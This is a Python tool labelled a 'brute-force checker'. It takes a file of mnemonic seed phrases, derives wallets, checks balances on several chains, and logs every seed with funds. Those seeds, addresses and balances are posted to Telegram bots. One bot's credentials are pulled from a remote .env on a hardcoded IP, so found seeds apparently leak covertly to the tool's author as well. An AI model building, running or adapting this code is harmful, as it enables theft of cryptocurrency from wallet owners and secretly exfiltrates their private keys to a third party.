import requests
from web3 import Web3
from eth_account import Account
import dotenv
import tempfile
import mysql.connector
from datetime import datetime
import os
import urllib3
import configparser

# === COLOR DEFINITIONS ===
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
BOLD = "\033[1m"
RESET = "\033[0m"

# === HD WALLET ===
Account.enable_unaudited_hdwallet_features()

# === FILES ===
SEED_FILE = "seeds.txt"
BALANCE_FILE = "results.txt"
NUM_WALLETS_PER_SEED = 1

# === DISABLE SSL WARNING ===
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# === LOAD .ENV FROM VPS WITH AUTH TOKEN ===
def load_remote_env(url, token):
    try:
        print(f"{CYAN}🔄 Fetching remote .env from server{RESET}")
        headers = {"X-Access-Token": token}
        response = requests.get(url, headers=headers, verify=False)
        response.raise_for_status()
        with tempfile.NamedTemporaryFile(mode="w+", delete=False) as tmp:
            tmp.write(response.text)
            tmp.flush()
            dotenv.load_dotenv(tmp.name)
        print(f"{GREEN}✅ .env loaded successfully!{RESET}")
    except Exception as e:
        print(f"{RED}[.env ERROR] Failed to load remote .env: {e}{RESET}")
        exit()

# Replace this with your actual VPS .env file URL
load_remote_env("https://195.35.2.192/.env", "e6ebcd29-c1f0-41e2-ac7e-e18451ef2a2d")

# Debug loaded env values
print(f"{YELLOW}[DEBUG] DB_HOST={os.getenv('DBHOST')}, DB_USER={os.getenv('DBUSER')}{RESET}")

# === ConfigParser for config.ini ===
config = configparser.ConfigParser()
config.read("config.ini")

TG_TOKEN_2 = config.get("TelegramBot", "token", fallback=None)
TG_CHAT_ID_2 = config.get("TelegramBot", "chat_id", fallback=None)

# === RPC & PRICES ===
RPC_URLS = {
    "ETH": os.getenv("RPC_ETH"),
    "BSC": os.getenv("RPC_BSC"),
    "OPBNB": os.getenv("RPC_OPBNB"),
    "POL": os.getenv("RPC_POL"),
}

PRICE_FEED = {
    "ETH": 3100,
    "BSC": 600,
    "OPBNB": 600,
}

# === Telegram Bots ===
TG_TOKEN_1 = os.getenv("TG_TOKEN_1")
TG_CHAT_ID_1 = os.getenv("TG_CHAT_ID_1")

# === MySQL Connection ===
db = mysql.connector.connect(
    host=os.getenv("DB_HOST"),
    user=os.getenv("DB_USER"),
    password=os.getenv("DB_PASSWORD"),
    database=os.getenv("DB_NAME"),
    use_pure=True
)
cursor = db.cursor()

# === Public IP Fetch ===
def get_public_ip():
    try:
        return requests.get('https://api.ipify.org').text.strip()
    except:
        return "UNKNOWN"

# === Telegram Send ===
def send_telegram(msg):
    for token, chat_id in [(TG_TOKEN_1, TG_CHAT_ID_1), (TG_TOKEN_2, TG_CHAT_ID_2)]:
        if token and chat_id:
            try:
                requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": chat_id, "text": msg})
            except Exception as e:
                print(f"{RED}[Telegram Error] {e}{RESET}")

# === Title Art ===
def show_title():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{MAGENTA}{BOLD}
██████╗ ██████╗ ██╗   ██╗████████╗███████╗    ███████╗ ██████╗ ██████╗  ██████╗███████╗ 
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝    ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝  
██████╔╝██████╔╝██║   ██║   ██║   █████╗█████╗█████╗  ██║   ██║██████╔╝██║     █████╗ 
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝╚════╝██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗    ██║     ╚██████╔╝██║  ██║╚██████╗███████╗  
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝  
{CYAN}
   ✨ BRUTE-FORCE CHECKER — MADE BY @DRIPOP_101 ✨
{RESET}
""")

# === Access Key Check ===
def check_access_key():
    key = input(f"{YELLOW}{BOLD}🔐 Enter your access key:{RESET} ").strip()
    current_ip = get_public_ip()

    cursor.execute("SELECT ip_address, used, expiry_date FROM access_keys WHERE api_key = %s", (key,))
    result = cursor.fetchone()

    if not result:
        print(f"{RED}❌ Invalid access key.{RESET}")
        exit()

    db_ip, used, expiry = result

    # Check expiration
    if expiry is not None:
        expiry_dt = datetime.strptime(str(expiry), "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiry_dt:
            print(f"{RED}❌ This access key is expired.{RESET}")
            exit()

    if db_ip and db_ip != current_ip:
        print(f"{RED}❌ This key is already used by another IP: {db_ip}{RESET}")
        exit()

    if not db_ip:
        cursor.execute("UPDATE access_keys SET ip_address = %s, used = 1 WHERE api_key = %s", (current_ip, key))
        db.commit()
        print(f"{GREEN}✅ Access granted! IP bound to {current_ip}{RESET}")

# === Wallet Check ===
def check_wallet(seed, index):
    try:
        acct = Account.from_mnemonic(seed, account_path=f"m/44'/60'/0'/0/{index}")
        address = acct.address

        for chain, rpc_url in RPC_URLS.items():
            web3 = Web3(Web3.HTTPProvider(rpc_url))
            if not web3.is_connected():
                print(f"{RED}[{chain}] ❌ RPC Failed{RESET}")
                continue

            balance_wei = web3.eth.get_balance(address)
            balance_eth = web3.from_wei(balance_wei, 'ether')
            usd_value = float(balance_eth) * PRICE_FEED.get(chain, 0)

            print(f"{CYAN}[{chain}] {address} -> {balance_eth} {chain} | ${usd_value:.6f}{RESET}")

            if balance_eth > 0:
                line = f"{balance_eth:.18f} {chain} | ${usd_value:.6f} | {address} | {seed}"
                with open(BALANCE_FILE, "a") as f:
                    f.write(line + "\n")
                send_telegram(line)

    except Exception as e:
        print(f"{RED}⚠️ Error for seed: {seed[:15]}... -> {e}{RESET}")

# === Main ===
def main():
    show_title()
    check_access_key()

    with open(SEED_FILE, "r") as f:
        seeds = [line.strip() for line in f if line.strip()]

    for seed in seeds:
        for i in range(NUM_WALLETS_PER_SEED):
            check_wallet(seed, i)

if __name__ == "__main__":
    main()
